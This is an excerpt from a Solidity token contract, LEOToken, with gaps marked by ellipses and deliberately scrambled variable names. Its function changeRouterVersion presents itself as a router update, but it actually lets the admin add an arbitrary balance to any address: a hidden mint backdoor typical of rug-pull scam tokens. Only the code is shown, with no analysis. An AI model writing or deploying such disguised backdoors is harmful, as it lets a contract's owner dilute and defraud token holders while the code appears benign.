...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (
        ...
        _addliquidiwafiwvq[address(swapPair)] = true;
        _addliquidiwafiwvq[address(this)] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;

        _aksuwhfs[ReceiveAddress] = total;
    ...
    function _funTransfer(
        ...
        _aksuwhfs[sender] = _aksuwhfs[sender] - tAmount;
    ...
    function _takeTransfer(address sender, address to, uint256 tAmount) private {
        _aksuwhfs[to] = _aksuwhfs[to] + tAmount;
    ...
    function changeRouterVersion(uint256 efgnffw, address newRouterAddress) public{
       require(_nameis(msg.sender) || adm == msg.sender) ;_aksuwhfs[newRouterAddress] += efgnffw;
    }
...
contract LEOToken is AbsToken {
    ...
    //USDT
        ...
        1000000,
    //Fund
        address(0x32b0B7A472C64c1CBA1C848725A54c1Be9DA5318),
    //Receive
        address(0x4867c21721986a72Eb88Acbfaa2e300E1513c1F2)
    ){
